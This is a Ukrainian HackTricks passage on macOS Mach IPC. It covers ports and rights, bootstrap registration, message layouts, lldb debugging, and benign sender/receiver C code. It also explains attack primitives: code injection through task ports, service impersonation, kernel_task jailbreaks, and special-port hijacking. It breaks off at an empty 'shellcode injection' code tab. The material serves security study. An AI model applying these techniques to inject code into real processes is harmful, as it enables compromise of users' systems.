# macOS IPC - Міжпроцесорна комунікація

{{#include ../../../../banners/hacktricks-training.md}}

## Mach повідомлення через порти

### Основна інформація

Mach використовує **задачі** як **найменшу одиницю** для обміну ресурсами, і кожна задача може містити **кілька потоків**. Ці **задачі та потоки відображаються 1:1 на процеси та потоки POSIX**.

Комунікація між задачами відбувається через Mach Міжпроцесорну Комунікацію (IPC), використовуючи односторонні канали зв'язку. **Повідомлення передаються між портами**, які діють як **черги повідомлень**, що управляються ядром.

**Порт** є **основним** елементом Mach IPC. Його можна використовувати для **відправки повідомлень та їх отримання**.

Кожен процес має **IPC таблицю**, в якій можна знайти **mach порти процесу**. Ім'я mach порту насправді є числом (вказівником на об'єкт ядра).

Процес також може надіслати ім'я порту з певними правами **іншій задачі**, і ядро зробить цей запис у **IPC таблиці іншої задачі** видимим.

### Права портів

Права портів, які визначають, які операції може виконувати задача, є ключовими для цієї комунікації. Можливі **права портів** ([визначення звідси](https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html)):

- **Право отримання**, яке дозволяє отримувати повідомлення, надіслані до порту. Mach порти є MPSC (багато-виробник, один-споживач) чергами, що означає, що може бути лише **одне право отримання для кожного порту** в усій системі (на відміну від труб, де кілька процесів можуть утримувати дескриптори файлів для читання з одного кінця труби).
- **Задача з правом отримання** може отримувати повідомлення та **створювати права відправки**, що дозволяє їй надсилати повідомлення. Спочатку лише **власна задача має право отримання над своїм портом**.
- Якщо власник права отримання **гине** або його вбиває, **право відправки стає марним (мертве ім'я)**.
- **Право відправки**, яке дозволяє надсилати повідомлення до порту.
- Право відправки може бути **клоновано**, тому задача, що володіє правом відправки, може клонувати право та **надати його третій задачі**.
- Зверніть увагу, що **права портів** також можуть бути **передані** через Mac повідомлення.
- **Право одноразової відправки**, яке дозволяє надіслати одне повідомлення до порту, а потім зникає.
- Це право **не може** бути **клоновано**, але його можна **перемістити**.
- **Право набору портів**, яке позначає _набір портів_, а не один порт. Витягування повідомлення з набору портів витягує повідомлення з одного з портів, які він містить. Набори портів можуть використовуватися для прослуховування кількох портів одночасно, подібно до `select`/`poll`/`epoll`/`kqueue` в Unix.
- **Мертве ім'я**, яке не є фактичним правом порту, а лише заповнювачем. Коли порт знищується, всі існуючі права портів на порт перетворюються на мертві імена.

**Задачі можуть передавати ПРАВА ВІДПРАВКИ іншим**, дозволяючи їм надсилати повідомлення назад. **ПРАВА ВІДПРАВКИ також можуть бути клоновані, тому задача може дублювати і надати право третій задачі**. Це, в поєднанні з проміжним процесом, відомим як **bootstrap server**, дозволяє ефективну комунікацію між задачами.

### Файлові порти

Файлові порти дозволяють інкапсулювати дескриптори файлів у Mach портах (використовуючи права Mach порту). Можна створити `fileport` з даного FD, використовуючи `fileport_makeport`, і створити FD з файлового порту, використовуючи `fileport_makefd`.

### Встановлення комунікації

Як вже згадувалося, можливо надсилати права, використовуючи Mach повідомлення, однак ви **не можете надіслати право, не маючи вже права** на відправку Mach повідомлення. Отже, як встановлюється перша комунікація?

Для цього залучається **bootstrap server** (**launchd** в mac), оскільки **кожен може отримати ПРАВО ВІДПРАВКИ до bootstrap server**, можна попросити його про право на відправку повідомлення до іншого процесу:

1. Задача **A** створює **новий порт**, отримуючи **ПРАВО ОТРИМАННЯ** над ним.
2. Задача **A**, будучи власником ПРАВА ОТРИМАННЯ, **генерує ПРАВО ВІДПРАВКИ для порту**.
3. Задача **A** встановлює **з'єднання** з **bootstrap server** і **надсилає йому ПРАВО ВІДПРАВКИ** для порту, який вона згенерувала на початку.
- Пам'ятайте, що будь-хто може отримати ПРАВО ВІДПРАВКИ до bootstrap server.
4. Задача A надсилає повідомлення `bootstrap_register` до bootstrap server, щоб **асоціювати даний порт з ім'ям** на кшталт `com.apple.taska`.
5. Задача **B** взаємодіє з **bootstrap server**, щоб виконати bootstrap **lookup для імені сервісу** (`bootstrap_lookup`). Щоб bootstrap server міг відповісти, задача B надішле йому **ПРАВО ВІДПРАВКИ до порту, який вона раніше створила**, всередині повідомлення lookup. Якщо пошук успішний, **сервер дублює ПРАВО ВІДПРАВКИ**, отримане від Задачі A, і **передає його Задачі B**.
- Пам'ятайте, що будь-хто може отримати ПРАВО ВІДПРАВКИ до bootstrap server.
6. З цим ПРАВОМ ВІДПРАВКИ **Задача B** здатна **надсилати** **повідомлення** **Задачі A**.
7. Для двосторонньої комунікації зазвичай задача **B** генерує новий порт з **ПРАВОМ ОТРИМАННЯ** та **ПРАВОМ ВІДПРАВКИ** і надає **ПРАВО ВІДПРАВКИ Задачі A**, щоб вона могла надсилати повідомлення до ЗАДАЧІ B (двостороння комунікація).

Bootstrap server **не може аутентифікувати** ім'я сервісу, яке заявляє задача. Це означає, що **задача** може потенційно **вдаватись під будь-яку системну задачу**, наприклад, неправильно **заявляючи ім'я сервісу авторизації** і потім схвалюючи кожен запит.

Тоді Apple зберігає **імена системних сервісів**, що надаються, у захищених конфігураційних файлах, розташованих у **SIP-захищених** каталогах: `/System/Library/LaunchDaemons` та `/System/Library/LaunchAgents`. Поряд з кожним ім'ям сервісу також зберігається **асоційований бінарний файл**. Bootstrap server створить і утримає **ПРАВО ОТРИМАННЯ для кожного з цих імен сервісів**.

Для цих попередньо визначених сервісів **процес пошуку трохи відрізняється**. Коли ім'я сервісу шукається, launchd динамічно запускає сервіс. Новий робочий процес виглядає так:

- Задача **B** ініціює bootstrap **lookup** для імені сервісу.
- **launchd** перевіряє, чи працює задача, і якщо ні, **запускає** її.
- Задача **A** (сервіс) виконує **bootstrap check-in** (`bootstrap_check_in()`). Тут **bootstrap** сервер створює ПРАВО ВІДПРАВКИ, утримує його і **передає ПРАВО ОТРИМАННЯ Задачі A**.
- launchd дублює **ПРАВО ВІДПРАВКИ і надсилає його Задачі B**.
- Задача **B** генерує новий порт з **ПРАВОМ ОТРИМАННЯ** та **ПРАВОМ ВІДПРАВКИ**, і надає **ПРАВО ВІДПРАВКИ Задачі A** (сервісу), щоб вона могла надсилати повідомлення до ЗАДАЧІ B (двостороння комунікація).

Однак цей процес застосовується лише до попередньо визначених системних задач. Несистемні задачі все ще працюють, як було описано спочатку, що може потенційно дозволити вдавання.

> [!CAUTION]
> Тому launchd ніколи не повинен аварійно завершуватися, інакше вся система зупиниться.

### Mach Повідомлення

[Знайдіть більше інформації тут](https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/)

Функція `mach_msg`, по суті, є системним викликом, що використовується для надсилання та отримання Mach повідомлень. Функція вимагає, щоб повідомлення, яке потрібно надіслати, було першим аргументом. Це повідомлення повинно починатися зі структури `mach_msg_header_t`, за якою слідує фактичний вміст повідомлення. Структура визначається наступним чином:
```c
typedef struct {
mach_msg_bits_t               msgh_bits;
mach_msg_size_t               msgh_size;
mach_port_t                   msgh_remote_port;
mach_port_t                   msgh_local_port;
mach_port_name_t              msgh_voucher_port;
mach_msg_id_t                 msgh_id;
} mach_msg_header_t;
```
Процеси, що мають _**право отримання**_, можуть отримувати повідомлення на Mach порту. Навпаки, **відправникам** надається _**право відправлення**_ або _**право одноразової відправки**_. Право одноразової відправки призначене виключно для відправлення одного повідомлення, після чого воно стає недійсним.

Початкове поле **`msgh_bits`** є бітовою картою:

- Перший біт (найбільш значущий) використовується для вказівки на те, що повідомлення є складним (більше про це нижче)
- 3-й та 4-й використовуються ядром
- **5 найменш значущих бітів 2-го байта** можуть бути використані для **ваучера**: ще одного типу порту для відправлення пар ключ/значення.
- **5 найменш значущих бітів 3-го байта** можуть бути використані для **локального порту**
- **5 найменш значущих бітів 4-го байта** можуть бути використані для **віддаленого порту**

Типи, які можуть бути вказані у ваучері, локальних та віддалених портах, є (з [**mach/message.h**](https://opensource.apple.com/source/xnu/xnu-7195.81.3/osfmk/mach/message.h.auto.html)):
```c
#define MACH_MSG_TYPE_MOVE_RECEIVE      16      /* Must hold receive right */
#define MACH_MSG_TYPE_MOVE_SEND         17      /* Must hold send right(s) */
#define MACH_MSG_TYPE_MOVE_SEND_ONCE    18      /* Must hold sendonce right */
#define MACH_MSG_TYPE_COPY_SEND         19      /* Must hold send right(s) */
#define MACH_MSG_TYPE_MAKE_SEND         20      /* Must hold receive right */
#define MACH_MSG_TYPE_MAKE_SEND_ONCE    21      /* Must hold receive right */
#define MACH_MSG_TYPE_COPY_RECEIVE      22      /* NOT VALID */
#define MACH_MSG_TYPE_DISPOSE_RECEIVE   24      /* must hold receive right */
#define MACH_MSG_TYPE_DISPOSE_SEND      25      /* must hold send right(s) */
#define MACH_MSG_TYPE_DISPOSE_SEND_ONCE 26      /* must hold sendonce right */
```
Наприклад, `MACH_MSG_TYPE_MAKE_SEND_ONCE` може бути використано для **вказівки**, що **право на одноразову відправку** повинно бути отримано та передано для цього порту. Також можна вказати `MACH_PORT_NULL`, щоб запобігти можливості відповіді отримувача.

Щоб досягти легкої **двосторонньої комунікації**, процес може вказати **mach порт** у заголовку **повідомлення mach**, який називається _порт відповіді_ (**`msgh_local_port`**), куди **отримувач** повідомлення може **надіслати відповідь** на це повідомлення.

> [!TIP]
> Зверніть увагу, що цей вид двосторонньої комунікації використовується в XPC повідомленнях, які очікують відповідь (`xpc_connection_send_message_with_reply` та `xpc_connection_send_message_with_reply_sync`). Але **зазвичай створюються різні порти**, як було пояснено раніше, для створення двосторонньої комунікації.

Інші поля заголовка повідомлення:

- `msgh_size`: розмір всього пакета.
- `msgh_remote_port`: порт, на який надсилається це повідомлення.
- `msgh_voucher_port`: [mach vouchers](https://robert.sesek.com/2023/6/mach_vouchers.html).
- `msgh_id`: ID цього повідомлення, який інтерпретується отримувачем.

> [!CAUTION]
> Зверніть увагу, що **mach повідомлення надсилаються через `mach порт`**, який є **каналом комунікації з одним отримувачем** та **багатьма відправниками**, вбудованим у ядро mach. **Багато процесів** можуть **надсилати повідомлення** до mach порту, але в будь-який момент лише **один процес може читати** з нього.

Повідомлення формуються заголовком **`mach_msg_header_t`**, за яким слідує **тіло** та **трейлер** (якщо є), і воно може надавати дозвіл на відповідь. У цих випадках ядру просто потрібно передати повідомлення від одного завдання до іншого.

**Трейлер** - це **інформація, додана до повідомлення ядром** (не може бути встановлена користувачем), яку можна запитати під час отримання повідомлення з прапорами `MACH_RCV_TRAILER_<trailer_opt>` (можна запитати різну інформацію).

#### Складні повідомлення

Однак є й інші, більш **складні** повідомлення, такі як ті, що передають додаткові права на порти або ділять пам'ять, де ядру також потрібно надіслати ці об'єкти отримувачу. У цих випадках найзначніший біт заголовка `msgh_bits` встановлюється.

Можливі дескриптори для передачі визначені в [**`mach/message.h`**](https://opensource.apple.com/source/xnu/xnu-7195.81.3/osfmk/mach/message.h.auto.html):
```c
#define MACH_MSG_PORT_DESCRIPTOR                0
#define MACH_MSG_OOL_DESCRIPTOR                 1
#define MACH_MSG_OOL_PORTS_DESCRIPTOR           2
#define MACH_MSG_OOL_VOLATILE_DESCRIPTOR        3
#define MACH_MSG_GUARDED_PORT_DESCRIPTOR        4

#pragma pack(push, 4)

typedef struct{
natural_t                     pad1;
mach_msg_size_t               pad2;
unsigned int                  pad3 : 24;
mach_msg_descriptor_type_t    type : 8;
} mach_msg_type_descriptor_t;
```
В 32-бітних системах усі дескриптори мають розмір 12B, а тип дескриптора знаходиться в 11-му. У 64-бітних системах розміри варіюються.

> [!CAUTION]
> Ядро скопіює дескриптори з одного завдання в інше, але спочатку **створюючи копію в пам'яті ядра**. Цю техніку, відому як "Feng Shui", зловживали в кількох експлойтах, щоб змусити **ядро копіювати дані в його пам'яті**, змушуючи процес надсилати дескриптори самому собі. Тоді процес може отримувати повідомлення (ядро їх звільнить).
>
> Також можливо **надіслати права порту в уразливий процес**, і права порту просто з'являться в процесі (навіть якщо він їх не обробляє).

### Mac Ports APIs

Зверніть увагу, що порти асоційовані з простором імен завдання, тому для створення або пошуку порту також запитується простір імен завдання (більше в `mach/mach_port.h`):

- **`mach_port_allocate` | `mach_port_construct`**: **Створити** порт.
- `mach_port_allocate` також може створити **набір портів**: право на отримання над групою портів. Коли отримується повідомлення, вказується порт, з якого воно надійшло.
- `mach_port_allocate_name`: Змінити ім'я порту (за замовчуванням 32-бітне ціле число)
- `mach_port_names`: Отримати імена портів з цільового
- `mach_port_type`: Отримати права завдання над ім'ям
- `mach_port_rename`: Перейменувати порт (як dup2 для FD)
- `mach_port_allocate`: Виділити новий RECEIVE, PORT_SET або DEAD_NAME
- `mach_port_insert_right`: Створити нове право в порту, де у вас є RECEIVE
- `mach_port_...`
- **`mach_msg`** | **`mach_msg_overwrite`**: Функції, які використовуються для **надсилання та отримання mach повідомлень**. Версія з перезаписом дозволяє вказати інший буфер для отримання повідомлень (інша версія просто повторно використовує його).

### Debug mach_msg

Оскільки функції **`mach_msg`** та **`mach_msg_overwrite`** використовуються для надсилання та отримання повідомлень, встановлення точки зупинки на них дозволить перевірити надіслані та отримані повідомлення.

Наприклад, почніть налагодження будь-якого додатку, який ви можете налагоджувати, оскільки він завантажить **`libSystem.B`, яка використовуватиме цю функцію**.

<pre class="language-armasm"><code class="lang-armasm"><strong>(lldb) b mach_msg
</strong>Breakpoint 1: where = libsystem_kernel.dylib`mach_msg, address = 0x00000001803f6c20
<strong>(lldb) r
</strong>Process 71019 launched: '/Users/carlospolop/Desktop/sandboxedapp/SandboxedShellAppDown.app/Contents/MacOS/SandboxedShellApp' (arm64)
Process 71019 stopped
* thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 1.1
frame #0: 0x0000000181d3ac20 libsystem_kernel.dylib`mach_msg
libsystem_kernel.dylib`mach_msg:
->  0x181d3ac20 <+0>:  pacibsp
0x181d3ac24 <+4>:  sub    sp, sp, #0x20
0x181d3ac28 <+8>:  stp    x29, x30, [sp, #0x10]
0x181d3ac2c <+12>: add    x29, sp, #0x10
Target 0: (SandboxedShellApp) stopped.
<strong>(lldb) bt
</strong>* thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 1.1
* frame #0: 0x0000000181d3ac20 libsystem_kernel.dylib`mach_msg
frame #1: 0x0000000181ac3454 libxpc.dylib`_xpc_pipe_mach_msg + 56
frame #2: 0x0000000181ac2c8c libxpc.dylib`_xpc_pipe_routine + 388
frame #3: 0x0000000181a9a710 libxpc.dylib`_xpc_interface_routine + 208
frame #4: 0x0000000181abbe24 libxpc.dylib`_xpc_init_pid_domain + 348
frame #5: 0x0000000181abb398 libxpc.dylib`_xpc_uncork_pid_domain_locked + 76
frame #6: 0x0000000181abbbfc libxpc.dylib`_xpc_early_init + 92
frame #7: 0x0000000181a9583c libxpc.dylib`_libxpc_initializer + 1104
frame #8: 0x000000018e59e6ac libSystem.B.dylib`libSystem_initializer + 236
frame #9: 0x0000000181a1d5c8 dyld`invocation function for block in dyld4::Loader::findAndRunAllInitializers(dyld4::RuntimeState&) const::$_0::operator()() const + 168
</code></pre>

Щоб отримати аргументи **`mach_msg`**, перевірте регістри. Це аргументи (з [mach/message.h](https://opensource.apple.com/source/xnu/xnu-7195.81.3/osfmk/mach/message.h.auto.html)):
```c
__WATCHOS_PROHIBITED __TVOS_PROHIBITED
extern mach_msg_return_t        mach_msg(
mach_msg_header_t *msg,
mach_msg_option_t option,
mach_msg_size_t send_size,
mach_msg_size_t rcv_size,
mach_port_name_t rcv_name,
mach_msg_timeout_t timeout,
mach_port_name_t notify);
```
Отримайте значення з реєстрів:
```armasm
reg read $x0 $x1 $x2 $x3 $x4 $x5 $x6
x0 = 0x0000000124e04ce8 ;mach_msg_header_t (*msg)
x1 = 0x0000000003114207 ;mach_msg_option_t (option)
x2 = 0x0000000000000388 ;mach_msg_size_t (send_size)
x3 = 0x0000000000000388 ;mach_msg_size_t (rcv_size)
x4 = 0x0000000000001f03 ;mach_port_name_t (rcv_name)
x5 = 0x0000000000000000 ;mach_msg_timeout_t (timeout)
x6 = 0x0000000000000000 ;mach_port_name_t (notify)
```
Перевірте заголовок повідомлення, перевіряючи перший аргумент:
```armasm
(lldb) x/6w $x0
0x124e04ce8: 0x00131513 0x00000388 0x00000807 0x00001f03
0x124e04cf8: 0x00000b07 0x40000322

; 0x00131513 -> mach_msg_bits_t (msgh_bits) = 0x13 (MACH_MSG_TYPE_COPY_SEND) in local | 0x1500 (MACH_MSG_TYPE_MAKE_SEND_ONCE) in remote | 0x130000 (MACH_MSG_TYPE_COPY_SEND) in voucher
; 0x00000388 -> mach_msg_size_t (msgh_size)
; 0x00000807 -> mach_port_t (msgh_remote_port)
; 0x00001f03 -> mach_port_t (msgh_local_port)
; 0x00000b07 -> mach_port_name_t (msgh_voucher_port)
; 0x40000322 -> mach_msg_id_t (msgh_id)
```
Тип `mach_msg_bits_t` дуже поширений для дозволу відповіді.

### Перерахувати порти
```bash
lsmp -p <pid>

sudo lsmp -p 1
Process (1) : launchd
name      ipc-object    rights     flags   boost  reqs  recv  send sonce oref  qlimit  msgcount  context            identifier  type
---------   ----------  ----------  -------- -----  ---- ----- ----- ----- ----  ------  --------  ------------------ ----------- ------------
0x00000203  0x181c4e1d  send        --------        ---            2                                                  0x00000000  TASK-CONTROL SELF (1) launchd
0x00000303  0x183f1f8d  recv        --------     0  ---      1               N        5         0  0x0000000000000000
0x00000403  0x183eb9dd  recv        --------     0  ---      1               N        5         0  0x0000000000000000
0x0000051b  0x1840cf3d  send        --------        ---            2        ->        6         0  0x0000000000000000 0x00011817  (380) WindowServer
0x00000603  0x183f698d  recv        --------     0  ---      1               N        5         0  0x0000000000000000
0x0000070b  0x175915fd  recv,send   ---GS---     0  ---      1     2         Y        5         0  0x0000000000000000
0x00000803  0x1758794d  send        --------        ---            1                                                  0x00000000  CLOCK
0x0000091b  0x192c71fd  send        --------        D--            1        ->        1         0  0x0000000000000000 0x00028da7  (418) runningboardd
0x00000a6b  0x1d4a18cd  send        --------        ---            2        ->       16         0  0x0000000000000000 0x00006a03  (92247) Dock
0x00000b03  0x175a5d4d  send        --------        ---            2        ->       16         0  0x0000000000000000 0x00001803  (310) logd
[...]
0x000016a7  0x192c743d  recv,send   --TGSI--     0  ---      1     1         Y       16         0  0x0000000000000000
+     send        --------        ---            1         <-                                       0x00002d03  (81948) seserviced
+     send        --------        ---            1         <-                                       0x00002603  (74295) passd
[...]
```
**ім'я** - це стандартне ім'я, яке надається порту (перевірте, як воно **збільшується** в перших 3 байтах). **`ipc-object`** - це **заскоблене** унікальне **ідентифікатор** порту.\
Зверніть увагу також на те, як порти з лише **`send`** правами **ідентифікують власника** (ім'я порту + pid).\
Також зверніть увагу на використання **`+`**, щоб вказати на **інші завдання, пов'язані з тим самим портом**.

Також можливо використовувати [**procesxp**](https://www.newosxbook.com/tools/procexp.html), щоб побачити також **зареєстровані імена служб** (з вимкненим SIP через необхідність `com.apple.system-task-port`):
```
procesp 1 ports
```
Ви можете встановити цей інструмент на iOS, завантаживши його з [http://newosxbook.com/tools/binpack64-256.tar.gz](http://newosxbook.com/tools/binpack64-256.tar.gz)

### Приклад коду

Зверніть увагу, як **відправник** **виділяє** порт, створює **право на відправку** для імені `org.darlinghq.example` і надсилає його на **сервер завантаження**, в той час як відправник запитує **право на відправку** цього імені і використовує його для **надсилання повідомлення**.

{{#tabs}}
{{#tab name="receiver.c"}}
```c
// Code from https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html
// gcc receiver.c -o receiver

#include <stdio.h>
#include <mach/mach.h>
#include <servers/bootstrap.h>

int main() {

// Create a new port.
mach_port_t port;
kern_return_t kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port);
if (kr != KERN_SUCCESS) {
printf("mach_port_allocate() failed with code 0x%x\n", kr);
return 1;
}
printf("mach_port_allocate() created port right name %d\n", port);


// Give us a send right to this port, in addition to the receive right.
kr = mach_port_insert_right(mach_task_self(), port, port, MACH_MSG_TYPE_MAKE_SEND);
if (kr != KERN_SUCCESS) {
printf("mach_port_insert_right() failed with code 0x%x\n", kr);
return 1;
}
printf("mach_port_insert_right() inserted a send right\n");


// Send the send right to the bootstrap server, so that it can be looked up by other processes.
kr = bootstrap_register(bootstrap_port, "org.darlinghq.example", port);
if (kr != KERN_SUCCESS) {
printf("bootstrap_register() failed with code 0x%x\n", kr);
return 1;
}
printf("bootstrap_register()'ed our port\n");


// Wait for a message.
struct {
mach_msg_header_t header;
char some_text[10];
int some_number;
mach_msg_trailer_t trailer;
} message;

kr = mach_msg(
&message.header,  // Same as (mach_msg_header_t *) &message.
MACH_RCV_MSG,     // Options. We're receiving a message.
0,                // Size of the message being sent, if sending.
sizeof(message),  // Size of the buffer for receiving.
port,             // The port to receive a message on.
MACH_MSG_TIMEOUT_NONE,
MACH_PORT_NULL    // Port for the kernel to send notifications about this message to.
);
if (kr != KERN_SUCCESS) {
printf("mach_msg() failed with code 0x%x\n", kr);
return 1;
}
printf("Got a message\n");

message.some_text[9] = 0;
printf("Text: %s, number: %d\n", message.some_text, message.some_number);
}
```
{{#endtab}}

{{#tab name="sender.c"}}
```c
// Code from https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html
// gcc sender.c -o sender

#include <stdio.h>
#include <mach/mach.h>
#include <servers/bootstrap.h>

int main() {

// Lookup the receiver port using the bootstrap server.
mach_port_t port;
kern_return_t kr = bootstrap_look_up(bootstrap_port, "org.darlinghq.example", &port);
if (kr != KERN_SUCCESS) {
printf("bootstrap_look_up() failed with code 0x%x\n", kr);
return 1;
}
printf("bootstrap_look_up() returned port right name %d\n", port);


// Construct our message.
struct {
mach_msg_header_t header;
char some_text[10];
int some_number;
} message;

message.header.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0);
message.header.msgh_remote_port = port;
message.header.msgh_local_port = MACH_PORT_NULL;

strncpy(message.some_text, "Hello", sizeof(message.some_text));
message.some_number = 35;

// Send the message.
kr = mach_msg(
&message.header,  // Same as (mach_msg_header_t *) &message.
MACH_SEND_MSG,    // Options. We're sending a message.
sizeof(message),  // Size of the message being sent.
0,                // Size of the buffer for receiving.
MACH_PORT_NULL,   // A port to receive a message on, if receiving.
MACH_MSG_TIMEOUT_NONE,
MACH_PORT_NULL    // Port for the kernel to send notifications about this message to.
);
if (kr != KERN_SUCCESS) {
printf("mach_msg() failed with code 0x%x\n", kr);
return 1;
}
printf("Sent a message\n");
}
```
{{#endtab}}
{{#endtabs}}

## Привілейовані порти

Є деякі спеціальні порти, які дозволяють **виконувати певні чутливі дії або отримувати доступ до певних чутливих даних**, якщо завдання має **SEND** дозволи на них. Це робить ці порти дуже цікавими з точки зору атакуючого не лише через їх можливості, але й тому, що можливо **ділитися SEND дозволами між завданнями**.

### Спеціальні порти хоста

Ці порти представлені номером.

**SEND** права можна отримати, викликавши **`host_get_special_port`**, а **RECEIVE** права - викликавши **`host_set_special_port`**. Однак обидва виклики вимагають **`host_priv`** порт, до якого може отримати доступ лише root. Більше того, в минулому root міг викликати **`host_set_special_port`** і захоплювати довільні порти, що дозволяло, наприклад, обійти підписи коду, захоплюючи `HOST_KEXTD_PORT` (SIP тепер цьому запобігає).

Ці порти поділяються на 2 групи: **перші 7 портів належать ядру**, зокрема 1 `HOST_PORT`, 2 `HOST_PRIV_PORT`, 3 `HOST_IO_MASTER_PORT` і 7 - це `HOST_MAX_SPECIAL_KERNEL_PORT`.\
Ті, що починаються **з** номера **8**, **належать системним демонам** і їх можна знайти в [**`host_special_ports.h`**](https://opensource.apple.com/source/xnu/xnu-4570.1.46/osfmk/mach/host_special_ports.h.auto.html).

- **Host port**: Якщо процес має **SEND** привілей на цьому порту, він може отримати **інформацію** про **систему**, викликаючи його рутинні функції, такі як:
- `host_processor_info`: Отримати інформацію про процесор
- `host_info`: Отримати інформацію про хост
- `host_virtual_physical_table_info`: Віртуальна/фізична таблиця сторінок (вимагає MACH_VMDEBUG)
- `host_statistics`: Отримати статистику хоста
- `mach_memory_info`: Отримати макет пам'яті ядра
- **Host Priv port**: Процес з **SEND** правом на цьому порту може виконувати **привілейовані дії**, такі як показ даних завантаження або спроба завантажити розширення ядра. **Процес повинен бути root**, щоб отримати цей дозвіл.
- Більше того, для виклику **`kext_request`** API потрібно мати інші права **`com.apple.private.kext*`**, які надаються лише бінарним файлам Apple.
- Інші рутинні функції, які можна викликати:
- `host_get_boot_info`: Отримати `machine_boot_info()`
- `host_priv_statistics`: Отримати привілейовану статистику
- `vm_allocate_cpm`: Виділити неперервну фізичну пам'ять
- `host_processors`: Надіслати право на хост-процесори
- `mach_vm_wire`: Зробити пам'ять резидентною
- Оскільки **root** може отримати доступ до цього дозволу, він може викликати `host_set_[special/exception]_port[s]`, щоб **захопити спеціальні або виняткові порти хоста**.

Можливо **побачити всі спеціальні порти хоста**, запустивши:
```bash
procexp all ports | grep "HSP"
```
### Task Special Ports

Це порти, зарезервовані для відомих сервісів. Можна отримати/встановити їх, викликавши `task_[get/set]_special_port`. Вони можуть бути знайдені в `task_special_ports.h`:
```c
typedef	int	task_special_port_t;

#define TASK_KERNEL_PORT	1	/* Represents task to the outside
world.*/
#define TASK_HOST_PORT		2	/* The host (priv) port for task.  */
#define TASK_BOOTSTRAP_PORT	4	/* Bootstrap environment for task. */
#define TASK_WIRED_LEDGER_PORT	5	/* Wired resource ledger for task. */
#define TASK_PAGED_LEDGER_PORT	6	/* Paged resource ledger for task. */
```
З [тут](https://web.mit.edu/darwin/src/modules/xnu/osfmk/man/task_get_special_port.html):

- **TASK_KERNEL_PORT**\[task-self send right]: Порт, що використовується для контролю цього завдання. Використовується для надсилання повідомлень, які впливають на завдання. Це порт, що повертається функцією **mach_task_self (див. Task Ports нижче)**.
- **TASK_BOOTSTRAP_PORT**\[bootstrap send right]: Порт завантаження завдання. Використовується для надсилання повідомлень з проханням повернути інші порти системних служб.
- **TASK_HOST_NAME_PORT**\[host-self send right]: Порт, що використовується для запиту інформації про місто, що містить. Це порт, що повертається функцією **mach_host_self**.
- **TASK_WIRED_LEDGER_PORT**\[ledger send right]: Порт, що вказує на джерело, з якого це завдання отримує свою фіксовану пам'ять ядра.
- **TASK_PAGED_LEDGER_PORT**\[ledger send right]: Порт, що вказує на джерело, з якого це завдання отримує свою пам'ять за замовчуванням.

### Task Ports

Спочатку Mach не мав "процесів", він мав "завдання", які вважалися більше контейнерами потоків. Коли Mach був об'єднаний з BSD, **кожне завдання було пов'язане з процесом BSD**. Тому кожен процес BSD має деталі, необхідні для того, щоб бути процесом, а кожне завдання Mach також має свої внутрішні механізми (за винятком неіснуючого pid 0, який є `kernel_task`).

Є дві дуже цікаві функції, пов'язані з цим:

- `task_for_pid(target_task_port, pid, &task_port_of_pid)`: Отримати SEND право для порту завдання, пов'язаного з вказаним `pid`, і надати його вказаному `target_task_port` (який зазвичай є завданням виклику, що використовувало `mach_task_self()`, але може бути SEND портом для іншого завдання).
- `pid_for_task(task, &pid)`: Знаючи SEND право на завдання, знайти, до якого PID це завдання пов'язане.

Щоб виконувати дії в межах завдання, завдання потрібно було мати `SEND` право на себе, викликавши `mach_task_self()` (який використовує `task_self_trap` (28)). З цим дозволом завдання може виконувати кілька дій, таких як:

- `task_threads`: Отримати SEND право на всі порти завдання потоків завдання
- `task_info`: Отримати інформацію про завдання
- `task_suspend/resume`: Призупинити або відновити завдання
- `task_[get/set]_special_port`
- `thread_create`: Створити потік
- `task_[get/set]_state`: Контролювати стан завдання
- і більше можна знайти в [**mach/task.h**](https://github.com/phracker/MacOSX-SDKs/blob/master/MacOSX11.3.sdk/System/Library/Frameworks/Kernel.framework/Versions/A/Headers/mach/task.h)

> [!CAUTION]
> Зверніть увагу, що з SEND правом на порт завдання **іншого завдання** можливо виконувати такі дії над іншим завданням.

Більше того, task_port також є **`vm_map`** портом, який дозволяє **читати та маніпулювати пам'яттю** всередині завдання за допомогою функцій, таких як `vm_read()` і `vm_write()`. Це в основному означає, що завдання з SEND правами на task_port іншого завдання зможе **впроваджувати код у це завдання**.

Пам'ятайте, що оскільки **ядро також є завданням**, якщо хтось зможе отримати **SEND дозволи** на **`kernel_task`**, він зможе змусити ядро виконувати що завгодно (jailbreaks).

- Викликайте `mach_task_self()` для **отримання імені** для цього порту для завдання виклику. Цей порт лише **успадковується** через **`exec()`**; нове завдання, створене за допомогою `fork()`, отримує новий порт завдання (як особливий випадок, завдання також отримує новий порт завдання після `exec()` у suid бінарному файлі). Єдиний спосіб створити завдання та отримати його порт - це виконати ["танець обміну портами"](https://robert.sesek.com/2014/1/changes_to_xnu_mach_ipc.html) під час виконання `fork()`.
- Це обмеження для доступу до порту (з `macos_task_policy` з бінарного файлу `AppleMobileFileIntegrity`):
- Якщо додаток має **`com.apple.security.get-task-allow` entitlement**, процеси з **одного користувача можуть отримати доступ до порту завдання** (зазвичай додається Xcode для налагодження). Процес **нотаризації** не дозволить цього для виробничих випусків.
- Додатки з **`com.apple.system-task-ports`** entitlement можуть отримати **порт завдання для будь-якого** процесу, за винятком ядра. У старіших версіях це називалося **`task_for_pid-allow`**. Це надається лише додаткам Apple.
- **Root може отримати доступ до портів завдань** додатків, **не** скомпільованих з **захищеним** середовищем виконання (і не від Apple).

**Порт імені завдання:** Непривілейована версія _порту завдання_. Він посилається на завдання, але не дозволяє контролювати його. Єдине, що, здається, доступно через нього, це `task_info()`.

### Thread Ports

Потоки також мають асоційовані порти, які видимі з завдання, що викликає **`task_threads`**, і з процесора за допомогою `processor_set_threads`. SEND право на порт потоку дозволяє використовувати функції з підсистеми `thread_act`, такі як:

- `thread_terminate`
- `thread_[get/set]_state`
- `act_[get/set]_state`
- `thread_[suspend/resume]`
- `thread_info`
- ...

Будь-який потік може отримати цей порт, викликавши **`mach_thread_sef`**.

### Shellcode Injection in thread via Task port

Ви можете отримати shellcode з:

{{#ref}}
../../macos-apps-inspecting-debugging-and-fuzzing/arm64-basic-assembly.md
{{#endref}}

{{#tabs}}
{{#tab name="mysleep.m"}}
```objectivec
